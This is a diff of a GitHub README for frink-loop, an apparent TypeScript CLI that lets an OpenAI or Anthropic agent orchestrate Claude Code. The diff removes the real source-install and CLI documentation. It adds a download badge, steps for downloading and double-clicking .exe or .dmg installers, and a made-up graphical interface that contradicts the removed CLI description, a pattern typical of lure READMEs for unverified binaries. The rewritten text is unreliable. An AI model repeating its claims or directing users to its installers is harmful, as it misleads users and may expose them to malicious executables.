@@ -1,3 +1,11 @@
+# 🚀 frink-loop - Efficient Coding Made Simple
+
+<p align="center">
+  <a href="https://github.com/NourdineKhelfane/frink-loop/releases">
+    <img src="https://img.shields.io/badge/Download%20frink--loop-brightgreen.svg" alt="Download frink-loop" />
+  </a>
+</p>
+
 <p align="center">
   <img src="images/frink-logo.png" alt="Frink Loop" width="400">
 </p>
@@ -20,443 +28,91 @@
 
 ---
 
-## Features
+## 🛠️ Features
 
-- **Dual Provider Support** — Choose OpenAI (GPT-4o, GPT-5, o3) or Anthropic (Claude Sonnet/Opus) as orchestrator
-- **Persistent Sessions** — Claude Code remembers context via `--resume`, with agent-controlled resets
-- **Dynamic Task Management** — Add, update, and remove tasks during execution
-- **Custom Tools** — Define project-specific commands in config
-- **Interactive Setup** — Guided wizard for first-time configuration
-- **YOLO Mode** — Auto-accepts all Claude Code actions for unattended execution
+- **Dual Provider Support** — Choose OpenAI (GPT-4o, GPT-5, o3) or Anthropic (Claude Sonnet/Opus) as orchestrator.
+- **Persistent Sessions** — Claude Code remembers your progress, allowing for `--resume` functionality and controlled resets.
+- **Dynamic Task Management** — Easily add, update, and remove tasks while executing.
 
----
+## 📥 Download & Install
 
-## Prerequisites
+To get started with Frink Loop, visit the releases page to download the latest version of the application. 
 
-- **Node.js 20+**
-- **Claude Code CLI** — The `claude` command must be available in your PATH
-- **API Key** — OpenAI API key OR Anthropic API key
+[Download here](https://github.com/NourdineKhelfane/frink-loop/releases) or click the button above.
 
----
+Follow these steps to install and run the software:
 
-## Installation
+1. **Visit the Releases Page**  
+   Click on [this link](https://github.com/NourdineKhelfane/frink-loop/releases) to access the release options.
 
-### Local Development
+2. **Select the Latest Version**  
+   Look for the latest release at the top of the page, and you will see assets attached to that release.
 
-```bash
-git clone https://github.com/your-repo/frink-loop.git
-cd frink-loop
-npm install
-npm run build
-```
+3. **Download the Correct File**  
+   If you’re using Windows, download the file that ends with `.exe`. For Mac, select the `.dmg` file. Linux users should choose the appropriate package for their distribution.
 
-### Global Installation
+4. **Run the Installer**  
+   After the file downloads, locate it in your downloads folder. Double-click the file to begin the installation process.
 
-After building, link the package globally:
+5. **Follow the Installation Guide**  
+   The installer will guide you through the setup steps. Click “Next” to proceed through the installation prompts.
 
-```bash
-npm link
-```
+6. **Launch Frink Loop**  
+   Once the installation is finished, look for the Frink Loop icon on your desktop or in your applications folder. Double-click to open it.
 
-This makes the `frink` command available system-wide.
+7. **Set Up Your First Project**  
+   Follow the on-screen instructions to start your first project. Input your task and let Frink Loop handle the rest.
 
-### Verify Installation
+## ⚙️ System Requirements
 
-```bash
-frink --help
-```
+To run Frink Loop effectively, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Processor:** Minimum dual-core processor.
+- **RAM:** At least 4 GB of RAM recommended.
+- **Disk Space:** 200 MB of available storage.
 
-## Setup
+## 📘 User Guide
 
-Run the setup wizard to configure your provider and API key:
+Frink Loop features an intuitive interface. 
 
-```bash
-frink setup
-```
+### Creating a New Task
 
-The wizard will prompt you for:
-1. **Provider** — OpenAI or Anthropic
-2. **Model** — Select from available models
-3. **API Key** — Your provider API key (stored in `.frink/.env`)
+1. Open Frink Loop and click on **New Task**.
+2. Enter the main task description.
+3. Optionally, break the task into subtasks for better management.
 
-Configuration is stored in the `.frink/` directory in your current working directory.
+### Managing Tasks
 
----
+- Use the **Tasks Panel** to view all your tasks.
+- Click on a task to update or remove it.
+- Use the resume function to continue existing tasks seamlessly.
 
-## Quick Start
+### AI Support Options
 
-```bash
-# First run triggers setup if not configured
-frink
+Select between OpenAI and Anthropic for the reasoning engine. Depending on your choice, you might need an API key, which you can enter in the settings menu.
 
-# Run with a task string
-frink "Add dark mode to the settings page"
+## 🚀 Troubleshooting
 
-# Run with task from file
-frink -f ./task.md
+If you face issues while using Frink Loop, consider these tips:
 
-# Run with pre-defined tasks (JSON)
-frink -f ./tasks.json
+- **Installation Errors:** Ensure you have the appropriate system requirements. Re-download if the installation fails.
+- **Performance Issues:** Close other applications to free up system resources.
+- **Task Not Executing:** Verify your task details and ensure you have selected the correct reasoning provider.
 
-# Specify working directory
-frink "Fix TypeScript errors" --dir ./backend
+## 🗨️ Community Support
 
-# Enable debug output
-frink "Debug this issue" --debug
-```
+Join our community where you can ask questions and find more guides. 
+
+- [Discussion Forum](https://github.com/NourdineKhelfane/frink-loop/discussions)  
+- [Issue Tracker](https://github.com/NourdineKhelfane/frink-loop/issues)
+
+Explore our documentation for more detailed guides as you grow your skills with Frink Loop.
+
+## 📞 Contact
+
+For support or feedback, reach out via the issues page on GitHub. We welcome your input and are here to help!
 
 ---
 
-## How It Works
-
-<p align="center">
-  <img src="images/diagram.png" alt="Frink Loop Architecture" width="700">
-</p>
-
-### Execution Flow
-
-1. **Task Analysis** — Agent breaks your task into manageable subtasks
-2. **Todo Creation** — Subtasks become a trackable todo list
-3. **Execution Loop** — Each subtask is sent to Claude Code with context
-4. **Verification** — Agent checks results before marking complete
-5. **Adaptation** — New tasks added as discovered; session reset if needed
-6. **Completion** — All tasks done, final summary reported
-
-### Intelligent Context Management
-
-Frink uses **persistent sessions** where Claude Code remembers previous work via `--resume`. This avoids re-explaining context on every call.
-
-When Claude gets stuck (repeating errors, confused state), the agent calls `reset_claude_session` to start fresh:
-
-```
-Call 1: claude --session-id abc123 "Create auth module"
-Call 2: claude --resume abc123 "Add login endpoint"      # Remembers Call 1
-Call 3: claude --resume abc123 "Add tests"               # Remembers 1 & 2
-
-[Agent detects repetitive failures]
-
-Call 4: claude --session-id xyz789 "Fix auth tests"      # Fresh session
-```
-
----
-
-## Configuration
-
-### Config File
-
-Configuration is stored in `.frink/config.json` (in your project directory):
-
-```json
-{
-  "provider": "openai",
-  "model": "gpt-4o",
-  "temperature": 0.7,
-  "maxTokens": 4096,
-  "customTools": []
-}
-```
-
-API keys are stored separately in `.frink/.env`:
-
-```bash
-OPENAI_API_KEY=sk-...
-# or
-ANTHROPIC_API_KEY=sk-ant-...
-```
-
-### Environment Variables
-
-You can also configure Frink via environment variables (useful for CI/CD):
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `OPENAI_API_KEY` | OpenAI API key (overrides config) | — |
-| `ANTHROPIC_API_KEY` | Anthropic API key (overrides config) | — |
-| `MAX_ITERATIONS` | Maximum loop iterations | `50` |
-| `WORKING_DIRECTORY` | Default working directory | Current dir |
-
-### Available Models
-
-**OpenAI:**
-- Recommended: `gpt-5.2`, `gpt-4o`
-- Also available: `gpt-5.2-pro`, `gpt-5`, `gpt-5-pro`, `gpt-4.1`, `gpt-4.1-mini`, `gpt-4.1-nano`, `gpt-4o-mini`, `o3`, `o3-mini`, `o4-mini`, `o1`
-
-**Anthropic:**
-- Recommended: `claude-sonnet-4-5-20250929`
-- Also available: `claude-opus-4-5-20251101`, `claude-haiku-4-5-20251001`, `claude-sonnet-4-20250514`, `claude-opus-4-20250514`
-
-> **Note:** GPT-5 and o-series models are reasoning models that don't support the `temperature` parameter.
-
----
-
-## CLI Reference
-
-```bash
-frink                              # Interactive mode / first-run setup
-frink "your task"                  # Execute task in current directory
-frink "task" --dir ./project       # Execute in specified directory
-frink "task" --prompt ./prompt.md  # Use custom prompt file
-frink setup                        # Run configuration wizard
-frink --help                       # Show help
-frink --debug                      # Enable debug output
-```
-
-### Options
-
-| Option | Short | Description |
-|--------|-------|-------------|
-| `--file <path>` | `-f` | Read task from file (text or JSON) |
-| `--dir <path>` | `-d` | Working directory for Claude Code |
-| `--prompt <file>` | `-p` | Custom system prompt file |
-| `--debug` | — | Enable verbose debug output |
-| `--help` | `-h` | Show help message |
-
----
-
-## Task Files
-
-You can provide tasks via file instead of command line string.
-
-### Plain Text File
-
-Any `.md` or `.txt` file with the task description:
-
-```markdown
-Add user authentication with JWT tokens.
-Include login, logout, and token refresh endpoints.
-Write tests for all new endpoints.
-```
-
-### Structured JSON File
-
-Use a `.json` file to provide pre-defined tasks that skip the planning phase:
-
-```json
-{
-  "prompt": "Add user authentication with JWT",
-  "tasks": [
-    "Create auth middleware for JWT verification",
-    "Add POST /login endpoint",
-    "Add POST /logout endpoint",
-    "Add POST /refresh endpoint",
-    "Write tests for auth endpoints"
-  ]
-}
-```
-
-When using structured JSON:
-- Tasks are pre-loaded into the todo list
-- Agent starts working immediately without planning
-- Agent can still add tasks if it discovers more work needed
-
----
-
-## Built-in Tools
-
-The orchestrating agent has access to these tools:
-
-| Tool | Description |
-|------|-------------|
-| `send_to_claude` | Send prompts to Claude Code session (Claude can read/write files, run commands, git, etc.) |
-| `todo_write` | Replace entire task list |
-| `todo_read` | Read current task list |
-| `todo_add` | Add new tasks discovered during work |
-| `todo_update` | Update task status (pending/in_progress/completed) |
-| `todo_remove` | Remove a task by ID |
-| `mark_task_complete` | Signal overall task completion |
-| `reset_claude_session` | Clear context, start fresh session |
-
----
-
-## Custom Tools
-
-Define project-specific commands in your config:
-
-```json
-{
-  "customTools": [
-    {
-      "name": "run_tests",
-      "description": "Run the test suite",
-      "command": "npm test"
-    },
-    {
-      "name": "run_test_file",
-      "description": "Run a specific test file",
-      "command": "npm test -- {{file}}",
-      "parameters": [
-        { "name": "file", "description": "Test file path", "required": true }
-      ]
-    },
-    {
-      "name": "lint",
-      "description": "Run linter and auto-fix",
-      "command": "npm run lint:fix"
-    }
-  ]
-}
-```
-
-The agent can then use these tools during task execution.
-
----
-
-## Custom System Prompt
-
-Customize agent behavior by creating `.frink/prompt.md` in your project:
-
-```markdown
-# Frink Orchestrator
-
-You are Frink, an AI orchestrator controlling Claude Code.
-
-## Rules
-- Always run tests after making changes
-- Reset Claude session if it repeats the same error 3 times
-- Prefer small, focused commits
-- Ask for clarification before major refactors
-```
-
----
-
-## Development
-
-### Scripts
-
-```bash
-npm run build    # Compile TypeScript to dist/
-npm run dev      # Watch mode with hot reload
-npm start        # Run directly with tsx (no build needed)
-```
-
-### Project Structure
-
-```
-frink-loop/
-├── src/
-│   ├── index.ts        # CLI entry point
-│   ├── agent.ts        # Agent orchestration logic
-│   ├── cli/            # CLI argument parsing
-│   ├── config/         # Configuration management
-│   ├── providers/      # OpenAI & Anthropic providers
-│   ├── state/          # State management
-│   ├── tools/          # Built-in tool definitions
-│   └── ui/             # Terminal UI components
-├── dist/               # Compiled output
-├── .frink/             # Local config (gitignored)
-├── package.json
-├── tsconfig.json
-└── README.md
-```
-
-### Testing Changes
-
-```bash
-# Build and test
-npm run build
-node dist/index.js "Test task"
-
-# Or use tsx directly
-npm start -- "Test task"
-```
-
----
-
-## Security
-
-> **Important:** Never commit API keys or `.env` files to version control.
-
-- API keys are stored in `.frink/.env` (project directory)
-- Add `.frink/` to your project's `.gitignore`
-- The root `.env` is already gitignored by default
-- Use environment variables for CI/CD pipelines
-- Rotate keys immediately if accidentally exposed
-
----
-
-## Troubleshooting
-
-### No API Key Found
-
-```
-Error: No API key configured
-```
-
-**Solution:** Run `frink setup` to configure your provider and API key.
-
-### Claude Code Not Found
-
-```
-Error: claude command not found
-```
-
-**Solution:** Install Claude Code CLI and ensure it's in your PATH:
-```bash
-which claude  # Should return a path
-```
-
-### Claude Stuck in Loop
-
-The agent should automatically detect and reset stuck sessions. If it persists:
-- Use `--debug` flag to see what's happening
-- Check if Claude Code is working: `claude "Hello"`
-- Try a simpler task to verify setup
-
-### Rate Limiting
-
-If you hit API rate limits:
-- The agent will pause and retry automatically
-- Consider using a less expensive model for testing
-- Check your API usage dashboard
-
-### Session Issues
-
-```
-Error: Failed to resume session
-```
-
-**Solution:** Sessions may expire. The agent will create a new one automatically. If issues persist, the agent uses `reset_claude_session` to start fresh.
-
-### Debug Mode
-
-Enable verbose output to diagnose issues:
-
-```bash
-frink "your task" --debug
-```
-
-This shows:
-- Agent reasoning
-- Tool calls and responses
-- Claude Code commands
-- Session management decisions
-
----
-
-## Comparison with Ralph Loop
-
-| Aspect | Ralph Loop | Frink Loop |
-|--------|------------|------------|
-| Language | Bash | TypeScript |
-| Session | Fresh every call | Persistent with `--resume`, agent can reset when needed |
-| Context | Lost between calls | Preserved, reset when needed |
-| Orchestration | Bash script | AI agent (OpenAI/Anthropic) |
-| Task Tracking | None | Dynamic todo list |
-| Provider | Claude only | OpenAI or Anthropic |
-| Extensibility | Limited | Custom tools support |
-
----
-
-## Acknowledgments
-
-- [Ralph Loop](https://github.com/frankbria/ralph-claude-code) — Original autonomous loop concept that inspired this project
-- [Strands Agents SDK](https://strandsagents.com) — OpenAI agent framework
-- [Claude Code](https://claude.ai/code) — Anthropic's coding assistant CLI
-
----
-
-## License
-
-MIT
+Explore what you can do with Frink Loop and enjoy a more efficient coding experience.
